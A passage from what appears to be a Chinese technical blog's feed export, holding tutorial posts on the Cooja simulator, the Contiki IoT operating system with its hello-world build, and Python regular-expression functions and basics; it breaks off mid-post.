<h5 id="设置模拟选项"><a href="#设置模拟选项" class="headerlink" title="设置模拟选项"></a>设置模拟选项</h5><p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/14-2.png" alt="14-2"></p>
<ul>
<li><p>Simulation name 仿真名字。</p>
</li>
<li><p>Radio medium 无线介质，下拉选项：</p>
<ul>
<li><p>UDGM:Distance Loss 单位圆盘图：距离损失</p>
</li>
<li><p>UDGM:Constant Loss 单位圆盘图：常量损失</p>
</li>
<li><p>DGRM：有向图通信   </p>
</li>
<li><p>No radio traffic 无无线信道</p>
</li>
</ul>
</li>
<li><p>Mote startup delay 节点启动延时</p>
</li>
<li><p>Random seed 随机种子生成</p>
</li>
</ul>
<h5 id="仿真窗口"><a href="#仿真窗口" class="headerlink" title="仿真窗口"></a>仿真窗口</h5><p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/14-3.png" alt="14-3"></p>
<ul>
<li><p>Network window 网络窗口：显示在模拟网络中的所有节点</p>
</li>
<li><p>Timeline window 时间轴窗口：显示在模拟中的所有通信事件随着时间的推移-非常方便了解什么在网络上进行</p>
</li>
<li><p>Mote output window 节点输出窗口：显示所有节点的串口打印输出</p>
</li>
<li><p>Notes window 注释窗口：为仿真编写注释的地方</p>
</li>
<li><p>Simulation control window 仿真控制窗口：启动，暂停和重新加载我们的仿真</p>
</li>
</ul>
<h5 id="添加节点"><a href="#添加节点" class="headerlink" title="添加节点"></a>添加节点</h5><p>　　Motes -&gt; Add motes -&gt; Create new mote type -&gt; Sky mote。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/14-4.png" alt="14-4"></p>
<h5 id="创建节点类型"><a href="#创建节点类型" class="headerlink" title="创建节点类型"></a>创建节点类型</h5><p>　　添加描述，然后点击 Browse 选择我们的 Contiki 应用。国际惯例我们运行一个最简单的程序，进入到 /home/user/contiki-3.0/examples/hello-world 目录。加载里面的 hello-world.c，点击编译，等待编译完。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/14-5.png" alt="14-5"></p>
<p>　　然后点击 create 创建，在弹出的窗口填写节点基本信息：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/14-6.png" alt="14-6"></p>
<h5 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h5><p>　　我们可以看到在 Network window 已经有了一个节点，我们再点击控制 Simulation control window 的 start 按钮，在 Mote output 窗口可以看到打印出来的 Hello world。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/14-7.png" alt="14-7"></p>
<p>　　至此，我们初步了解了 Cooja 仿真器的用法，有了这个神器，我们就可以进行各种各样的模拟仿真实验，在复杂的网络中验证我们编写的程序。</p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>OS</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>Contiki</tag>
      </tags>
  </entry>
  <entry>
    <title>物联网操作系统：Contiki</title>
    <url>/2017/02/13/%E7%89%A9%E8%81%94%E7%BD%91%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%9AContiki/</url>
    <content><![CDATA[<p>　　Contiki：面向物联网的开源操作系统。</p>
<a id="more"></a>
<h4 id="Contiki-简介"><a href="#Contiki-简介" class="headerlink" title="Contiki 简介"></a>Contiki 简介</h4><p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/13-3.jpg" alt="12-3"></p>
<p>　　Contiki 是一个开源的、高度可移植的、支持网络的多任务操作系统，由瑞典计算机科学学院的 Adam Dunkels 博士开发。Contiki 完全采用 C 语言开发，对硬件的要求极低，典型的配置下 Contiki 只占用约 2K bytes 的 RAM 以及 40K bytes 的 Flash 存储器，目前已经移植到 8051 单片机 MSP430，AVR，ARM，PC 机等硬件平台上。</p>
<p>　　Contiki 支持 IPv4/IPv6 通信，提供了 uIPv6 协议栈、IPv4 协议栈（uIP），支持 TCP/UDP，还提供了线程、定时器、文件系统等功能。Contiki 操作系统是基于事件驱动的操作系统，在此内核上，应用程序可以在运行时动态加载，非常灵活。</p>
<p>　　Contiki 实现了一种轻量级的名为 protothread 的线程模型，形式上类似于传统线程的编程风格，该模型中多个线程共享同一个任务栈，线程切换只有 2 个字节的开销。由于 protothread 线程模型和事件驱动机制是整个 Contiki 系统的运行核心。</p>
<p>　　官网：<a href="http://www.contiki-os.org/index.html" target="_blank" rel="external">http://www.contiki-os.org/index.html</a></p>
<p>　　Github地址：<a href="https://github.com/contiki-os/contiki" target="_blank" rel="external">https://github.com/contiki-os/contiki</a></p>
<h4 id="Contiki-配置准备"><a href="#Contiki-配置准备" class="headerlink" title="Contiki 配置准备"></a>Contiki 配置准备</h4><h5 id="下载-Instant-Contiki"><a href="#下载-Instant-Contiki" class="headerlink" title="下载 Instant Contiki"></a>下载 Instant Contiki</h5><p>　　Instant Contiki 是基于 Ubuntu 的 Contiki 开发环境。它包含 Contiki 需要的所有工具和编译器。下载地址：<a href="https://sourceforge.net/projects/contiki/files/Instant%20Contiki/" target="_blank" rel="external">https://sourceforge.net/projects/contiki/files/Instant%20Contiki/</a> </p>
<h5 id="安装-VMWare"><a href="#安装-VMWare" class="headerlink" title="安装 VMWare"></a>安装 VMWare</h5><p>　　可以安装 VMWare workstation 也可以安装 VMware player。参考以下教程：</p>
<p>　　<a href="http://jingyan.baidu.com/article/4d58d54129e1cb9dd4e9c09f.html" target="_blank" rel="external">如何安装VMware player虚拟机教程 超级详细</a></p>
<p>　　<a href="http://jingyan.baidu.com/article/86fae346ce751b3c48121a6d.html" target="_blank" rel="external">vmware workstation 12 pro 虚拟机安装系统教程</a></p>
<h5 id="打开-Instant-Contiki"><a href="#打开-Instant-Contiki" class="headerlink" title="打开 Instant Contiki"></a>打开 Instant Contiki</h5><p>　　使用 VMWare Player 打开 Instant Contiki，然后登录到该系统，密码为：user。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/13-1.png" alt="12-1"></p>
<h4 id="Contiki系统目录结构"><a href="#Contiki系统目录结构" class="headerlink" title="Contiki系统目录结构"></a>Contiki系统目录结构</h4><p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2017/2/13-2.png" alt="12-2"></p>
<ul>
<li><p>apps：放置 Contiki 提供的应用，例如 ftp、shell、http server 等等，在项目程序开发过程中可以直接使用。使用这些应用程序的方式为，在项目的 Makefile 中，定义 APPS = [应用程序名称]。在以后的示例中会具体看到如何使用 apps。</p>
</li>
<li><p>core：放置 Contiki 的核心内容，调度(sys)，网络协议栈(net)，文件系统(cfs)，驱动的抽象层(dev)等等。</p>
</li>
<li><p>cpu：cpu 目录下是 Contiki 目前支持的微处理器，例如 arm、avr、msp430 等等。如果需要支持新的微处理器，可以在这里添加相应的源代码。</p>
</li>
<li><p>platform：platform 目录下是 Contiki 支持的硬件平台，例如 mx231cc、micaz、sky、win32 等等。Contiki 的平台移植主要在这个目录下完成。这一部分的代码与相应的硬件平台相关。</p>
</li>
<li><p>examples：放置对应平台开发的示例程序。</p>
</li>
<li><p>doc：doc 目录是 Contiki 帮助文档目录，对 Contiki 应用程序开发很有参考价值。使用前需要先用 Doxygen 进行编译。</p>
</li>
<li><p>tools：tools 目录下是开发过程中常用的一些工具，例如 CFS 相关的 makefsdata、网络相关的 tunslip、模拟器 cooja 和 mspsim 等等。</p>
</li>
</ul>
<p>　　<strong>其中移植主要修改的是三个目录：</strong></p>
<ul>
<li><p>cpu：添加芯片。</p>
</li>
<li><p>platform：添加平台。</p>
</li>
<li><p>examples：添加应用。</p>
</li>
</ul>
<h4 id="示例分析"><a href="#示例分析" class="headerlink" title="示例分析"></a>示例分析</h4><p>　　先来一个国际惯例：Hello World 程序。</p>
<p>　　Contiki 程序开发是以进程的方式实现，创建一个进程需要进行声明和定义。PROCESS(process_name, “process description”) 宏用于声明一个进程；PROCESS_THREAD(process_name, event, data) 宏用于定义进程执行主体。</p>
<p>　　进程执行主体代码中，必须以 PROCESS_BEGIN() 宏开始，以 PROCESS_END() 宏结束。此外，在进程中不能使用 switch 语句，慎重使用局部变量。</p>
<p>　　如果进程需要在系统启动时被自动执行，则可以使用 AUTOSTART_PROCESSES(&amp;process_name) 宏。该宏可以指定多个进程，如 AUTOSTART_PROCESSES(&amp;process_1, &amp;process_2)，表示 process_1 和 process_2 都会在系统启动时被启动。</p>
<p>　　打开 /contiki-3.0/examples/hello-world/ 目录下的 hello-world.c：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"contiki.h"</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; /* For printf() */</span></span></div><div class="line"><span class="comment">/*---------------------------------------------------------------------------*/</span></div><div class="line"><span class="comment">/* 声明一个名为hello_world_process进程 */</span></div><div class="line">PROCESS(hello_world_process, <span class="string">"Hello world process"</span>);</div><div class="line"><span class="comment">/* 这个进程需要自动启动，即当节点启动时启动本进程 */</span></div><div class="line">AUTOSTART_PROCESSES(&amp;hello_world_process);</div><div class="line"><span class="comment">/*---------------------------------------------------------------------------*/</span></div><div class="line"><span class="comment">/* hello_world_process进程的主体部分 */</span></div><div class="line">PROCESS_THREAD(hello_world_process, ev, data)</div><div class="line">&#123;</div><div class="line">  <span class="comment">/* 所有的进程开始执行前都必须要有这条语句 */</span></div><div class="line">  PROCESS_BEGIN();</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Hello, world\n"</span>);</div><div class="line"></div><div class="line">  <span class="comment">/* 所有的进程结束时都必须要有这条语句 */</span></div><div class="line">  PROCESS_END();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　打开 /contiki-3.0/examples/hello-world/ 目录下的 Makefile 文件。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/* 项目名称（主文件名称） */</span></div><div class="line">CONTIKI_PROJECT = hello-world</div><div class="line">all: $(CONTIKI_PROJECT)</div><div class="line"><span class="comment">/* Contiki源文件根目录，根据您的实际情况修改 */</span></div><div class="line">CONTIKI = ../..</div><div class="line"><span class="comment">/* 包含Contiki的Makefile，以实现整个Contiki系统的编译 */</span></div><div class="line">include $(CONTIKI)/Makefile.include</div></pre></td></tr></table></figure>
<h4 id="编译项目"><a href="#编译项目" class="headerlink" title="编译项目"></a>编译项目</h4><p>　　在控制台 /Shell 中进入 helloworld 项目目录，运行如下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> make TARGET=native</span></div></pre></td></tr></table></figure>
<p>　　编译成功后，项目目录下就会生成 hello-world.[目标平台] 的目标文件，如 hello-world.native。如果您使用的是 Linux 操作系统，可以运行如下命令查看 Contiki 程序运行结果：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> ./hello-world.native</span></div></pre></td></tr></table></figure>
<p>　　运行结果如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Starting Contiki</div><div class="line">Hello world :)</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>IoT</category>
        <category>OS</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>Contiki</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 正则表达式函数</title>
    <url>/2017/01/21/Python%20%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<p>　　Python 的 re 模块（Regular Expression 正则表达式）提供各种正则表达式的匹配操作，在文本解析、复杂字符串分析和信息提取时是一个非常有用的工具。本博客介绍了 re 模块的一些常用函数。</p>
<a id="more"></a>
<h4 id="re-compile-函数"><a href="#re-compile-函数" class="headerlink" title="re.compile()函数"></a>re.compile()函数</h4><p>　　re 模块提供了一个正则表达式引擎的接口，可以把正则表达式编译成一个正则表达式对象并用它们来进行匹配。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">re.compile(strPattern[, flag])</div></pre></td></tr></table></figure>
<p>　　把那些经常使用的正则表达式编译成正则表达式对象，这样可以提高一定的效率。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>p = re.compile(<span class="string">'a&#123;1,3&#125;'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> p</div><div class="line">&lt;_sre.SRE_Pattern object at <span class="number">0x033992C0</span>&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>p.findall(<span class="string">'babaabaaa'</span>)</div><div class="line">[<span class="string">'a'</span>, <span class="string">'aa'</span>, <span class="string">'aaa'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>p.findall(<span class="string">'abaababa'</span>)</div><div class="line">[<span class="string">'a'</span>, <span class="string">'aa'</span>, <span class="string">'a'</span>, <span class="string">'a'</span>]</div></pre></td></tr></table></figure>
<p><strong>编译标志</strong></p>
<p>　　编译标志让你可以修改正则表达式的一些运行方式。在 re 模块中标志可以使用两个名字，一个是全名如 IGNORECASE，一个是缩写，一字母形式如 I。</p>
<p><strong>标志含义:</strong></p>
<ul>
<li><p>DOTALL, S使 . 匹配包括换行在内的所有字符</p>
</li>
<li><p>IGNORECASE, I使匹配对大小写不敏感</p>
</li>
<li><p>LOCALE, L做本地化识别（locale-aware）匹配</p>
</li>
<li><p>MULTILINE, M多行匹配，影响 ^ 和 $</p>
</li>
<li><p>VERBOSE, X能够使用 REs 的 verbose 状态，使之被组织得更清晰易懂</p>
</li>
<li><p>I，IGNORECASE，使匹配对大小写不敏感；字符类和字符串匹配字母时忽略大小写。举个例子，[A-Z]也可以匹配小写字母，Spam 可以匹配 “Spam”, “spam”, 或 “spAM”。这个小写字母并不考虑当前位置。</p>
</li>
</ul>
<h4 id="re-match-函数"><a href="#re-match-函数" class="headerlink" title="re.match()函数"></a>re.match()函数</h4><p>　　re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回None。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">re.match(pattern, string, flags=<span class="number">0</span>)</div></pre></td></tr></table></figure>
<p>　　第 1 个参数是正则表达式，这里为”(\w+)\s”，如果匹配成功，则返回一个Match，否则返回一个None；</p>
<p>　　第 2 个参数表示要匹配的字符串；</p>
<p>　　第 3 个参数是标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。</p>
<p>　　<strong>MatchObject 实例也有几个方法和属性：</strong></p>
<ul>
<li><p>group() 返回被 RE 匹配的字符串</p>
</li>
<li><p>start() 返回匹配开始的位置</p>
</li>
<li><p>end() 返回匹配结束的位置</p>
</li>
<li><p>span() 返回一个元组包含匹配 (开始,结束) 的位置</p>
</li>
</ul>
<p>　　我们可以使用 group(num) 或 groups() 匹配对象函数来获取匹配表达式。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.match(<span class="string">r"www"</span>,<span class="string">'www.fzyLine.com'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> m,m.span(),m.group()</div><div class="line">&lt;_sre.SRE_Match object at <span class="number">0x02897E58</span>&gt; (<span class="number">0</span>, <span class="number">3</span>) www</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.match(<span class="string">r"com"</span>,<span class="string">'www.fzyLine.com'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> m,m.span(),m.group()</div><div class="line"><span class="keyword">None</span></div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">AttributeError: <span class="string">'NoneType'</span> object has no attribute <span class="string">'span'</span></div></pre></td></tr></table></figure>
<h4 id="re-search-函数"><a href="#re-search-函数" class="headerlink" title="re.search()函数"></a>re.search()函数</h4><p>　　re.search 扫描整个字符串并返回第一个成功的匹配。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">re.search(pattern, string, flags=0)</div></pre></td></tr></table></figure>
<p>　　参数含义与 re.match() 一样。</p>
<p>　　匹配成功 re.search() 方法返回一个匹配的对象，否则返回 None。我们可以使用 group(num) 或 groups() 匹配对象函数来获取匹配表达式。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.search(<span class="string">r"www"</span>,<span class="string">'www.fzyLine.com'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> m,m.span(),m.group()</div><div class="line">&lt;_sre.SRE_Match object at <span class="number">0x02897E58</span>&gt; (<span class="number">0</span>, <span class="number">3</span>) www</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.search(<span class="string">r"com"</span>,<span class="string">'www.fzyLine.com'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> m,m.span(),m.group()</div><div class="line">&lt;_sre.SRE_Match object at <span class="number">0x0284DDB0</span>&gt; (<span class="number">12</span>, <span class="number">15</span>) com</div></pre></td></tr></table></figure>
<p>　　<strong>re.match() 与 re.search() 的区别：</strong></p>
<p>　　re.match() 只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回 None；而re.search 匹配整个字符串，直到找到一个匹配。</p>
<h4 id="re-sub-函数"><a href="#re-sub-函数" class="headerlink" title="re.sub()函数"></a>re.sub()函数</h4><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">re.sub(pattern, repl, string, count)</div></pre></td></tr></table></figure>
<p>其中，</p>
<ul>
<li><p>pattern : 正则中的模式字符串。</p>
</li>
<li><p>repl : 替换的字符串，也可为一个函数。</p>
</li>
<li><p>string : 要被查找替换的原始字符串。</p>
</li>
<li><p>count : 模式匹配后替换的最大次数，默认 0 ，表示替换所有的匹配。</p>
</li>
</ul>
<p>　　re.sub 还允许使用函数对匹配项的替换进行复杂的处理。如：re.sub(r’\s’, lambda m: ‘[‘ + m.group(0) + ‘]’, text, 0)；将字符串中的空格’ ‘替换为’[ ]’。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"\."</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.sub(r,<span class="string">'-'</span>,<span class="string">'www.fzyLine.com'</span>)</div><div class="line"><span class="string">'www-fzyLine-com'</span></div></pre></td></tr></table></figure>
<h4 id="re-subn-函数"><a href="#re-subn-函数" class="headerlink" title="re.subn()函数"></a>re.subn()函数</h4><p>　　subn() 与 sub() 相同，但会返回新的字符串和替换次数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"\."</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.subn(r,<span class="string">'-'</span>,<span class="string">'www.fzyLine.com'</span>)</div><div class="line">(<span class="string">'www-fzyLine-com'</span>, <span class="number">2</span>)</div></pre></td></tr></table></figure>
<h4 id="re-split-函数"><a href="#re-split-函数" class="headerlink" title="re.split()函数"></a>re.split()函数</h4><p>　　re.split可以用来分割字符串，如：re.split(r’\s+’, text)；将字符串按空格分割成一个单词列表。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"\."</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.split(r,<span class="string">'www.fzyLine.com'</span>)</div><div class="line">[<span class="string">'www'</span>, <span class="string">'fzyLine'</span>, <span class="string">'com'</span>]</div></pre></td></tr></table></figure>
<h4 id="re-findall-函数"><a href="#re-findall-函数" class="headerlink" title="re.findall()函数"></a>re.findall()函数</h4><p>　　re.findall() 可以获取字符串中所有匹配的字符串。如：re.findall(r’\w<em>oo\w</em>‘, text)；获取字符串中，包含’oo’的所有单词。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"a\dc"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'a2cka4cka8c'</span>)</div><div class="line">[<span class="string">'a2c'</span>, <span class="string">'a4c'</span>, <span class="string">'a8c'</span>]</div></pre></td></tr></table></figure>
<h4 id="re-finditer-函数"><a href="#re-finditer-函数" class="headerlink" title="re.finditer()函数"></a>re.finditer()函数</h4><p>　　finditer() 找到 RE 匹配的所有子串，并把它们作为一个迭代器返回.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"a\dc"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.finditer(r,<span class="string">'a2cka4cka8c'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> m</div><div class="line">&lt;callable-iterator object at <span class="number">0x0292A4B0</span>&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> m:</div><div class="line"><span class="meta">... </span>    <span class="keyword">print</span> i.group()</div><div class="line">...</div><div class="line">a2c</div><div class="line">a4c</div><div class="line">a8c</div></pre></td></tr></table></figure>
<h4 id="group函数"><a href="#group函数" class="headerlink" title="group函数"></a>group函数</h4><h5 id="group-group1-…"><a href="#group-group1-…" class="headerlink" title="group([group1,…])"></a>group([group1,…])</h5><p>　　返回匹配到的一个或者多个子组。如果是一个参数，那么结果就是一个字符串，如果是多个参数，那么结果就是一个参数一个 item 的元组。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.match(<span class="string">r"(\d+),(\d+)"</span>,<span class="string">'123,456'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>m.group()</div><div class="line"><span class="string">'123,456'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="number">1</span>)</div><div class="line"><span class="string">'123'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="number">2</span>)</div><div class="line"><span class="string">'456'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="number">1</span>,<span class="number">2</span>)</div><div class="line">(<span class="string">'123'</span>, <span class="string">'456'</span>)</div></pre></td></tr></table></figure>
<h5 id="groups-default"><a href="#groups-default" class="headerlink" title="groups([default])"></a>groups([default])</h5><p>　　返回一个包含所有子组的元组。Default 是用来设置没有匹配到组的默认值的。Default 默认是 None。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.match(<span class="string">r"(\d+),(\d+)"</span>,<span class="string">'123,456'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>m.groups()</div><div class="line">(<span class="string">'123'</span>, <span class="string">'456'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.match(<span class="string">r"(\d+),?(\d+)?"</span>,<span class="string">'123'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>m.groups()</div><div class="line">(<span class="string">'123'</span>, <span class="keyword">None</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>m.groups(<span class="string">"0"</span>)</div><div class="line">(<span class="string">'123'</span>, <span class="string">'0'</span>)</div></pre></td></tr></table></figure>
<h5 id="groupdict-default"><a href="#groupdict-default" class="headerlink" title="groupdict([default])"></a>groupdict([default])</h5><p>　　返回匹配到的所有命名子组的字典。Key 是 name 值，value 是匹配到的值。参数 default 是没有匹配到的子组的默认值。这里与 groups() 方法的参数是一样的。默认值为 None。groupdict() 对没有 name 的子组不起作用，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.match(<span class="string">r"(\d+),(\d+)"</span>,<span class="string">'123,456'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>m.groupdict()</div><div class="line">&#123;&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.match(<span class="string">r"(?P&lt;first&gt;\d+),(?P&lt;second&gt;\d+)"</span>,<span class="string">'123,456'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>m.groupdict()</div><div class="line">&#123;<span class="string">'second'</span>: <span class="string">'456'</span>, <span class="string">'first'</span>: <span class="string">'123'</span>&#125;</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 正则表达式基础</title>
    <url>/2017/01/20/Python%20%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>　　正则表达式是一种小型的、高度专业化的编程语言，在Python中通过re模块实现，它使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。</p>
<a id="more"></a>
<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>　　正则表达式是由普通字符（例如字符 a 到 z）以及特殊字符（称为”元字符”）组成的文字模式。模式描述在搜索文本时要匹配的一个或多个字符串。正则表达式作为一个模板，将某个字符模式与所搜索的字符串进行匹配。</p>
<p>使用正则表达式可以：</p>
<ol>
<li>测试字符串内的模式。</li>
</ol>
<p>　　例如，可以测试输入字符串，以查看字符串内是否出现电话号码模式或信用卡号码模式。这称为数据验证。</p>
<ol>
<li>替换文本。</li>
</ol>
<p>　　可以使用正则表达式来识别文档中的特定文本，完全删除该文本或者用其他文本替换它。</p>
<ol>
<li>基于模式匹配从字符串中提取子字符串。</li>
</ol>
<p>　　可以查找文档内或输入域内特定的文本。</p>
<h4 id="普通字符"><a href="#普通字符" class="headerlink" title="普通字符"></a>普通字符</h4><p>　　大多数字母和字符一般都会和自身匹配。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r"abc"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'abckkkabc'</span>)</div><div class="line">[<span class="string">'abc'</span>, <span class="string">'abc'</span>]</div></pre></td></tr></table></figure>
<h4 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h4><h5 id="常用元字符"><a href="#常用元字符" class="headerlink" title="常用元字符"></a>常用元字符</h5><ul>
<li><code>.</code> 匹配除换行符以外的任意字符</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r".a"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'aabaca'</span>)</div><div class="line">[<span class="string">'aa'</span>, <span class="string">'ba'</span>, <span class="string">'ca'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'aabacadd'</span>)</div><div class="line">[<span class="string">'aa'</span>, <span class="string">'ba'</span>, <span class="string">'ca'</span>]</div></pre></td></tr></table></figure>
<ul>
<li><code>[...]</code> 字符集</li>
</ul>
<p>　　常用来指定一个字符集：<code>[abc],[a-z]</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r't[io]p'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'top tip ttp tmp'</span>)</div><div class="line">[<span class="string">'top'</span>, <span class="string">'tip'</span>]</div></pre></td></tr></table></figure>
<p>　　元字符在字符集中不起作用：<code>[...$]</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">r't[io$]p'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(r,<span class="string">'top tip ttp tmp t$p'</span>)</div><div class="line">[<span class="string">'top'</span>, <span class="string">'tip'</span>, <span class="string">'t$p'</span>]</div></pre></td></tr></table></figure>
<p>　　补集匹配不在区间范围内的字符：<code>[^...]</code></p>
